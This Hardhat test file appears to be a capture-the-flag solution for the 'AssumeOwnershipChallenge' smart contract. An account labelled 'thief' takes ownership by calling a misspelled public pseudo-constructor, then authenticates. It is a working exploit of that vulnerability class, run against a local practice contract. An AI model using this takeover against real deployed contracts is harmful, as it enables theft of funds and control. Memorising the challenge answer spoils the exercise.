import { expect } from "chai";
import { ethers } from "hardhat";

describe("AssumeOwnershipChallenge", () => {
  it("Solves the challenge", async () => {
    const [, thief] = await ethers.getSigners();

    // deploy contract
    const contract = await ethers.deployContract("AssumeOwnershipChallenge");
    await contract.waitForDeployment();

    // call "constructor"
    const own = await contract.connect(thief).AssumeOwmershipChallenge();
    await own.wait();

    // authenticate
    const authenticate = await contract.connect(thief).authenticate();
    await authenticate.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
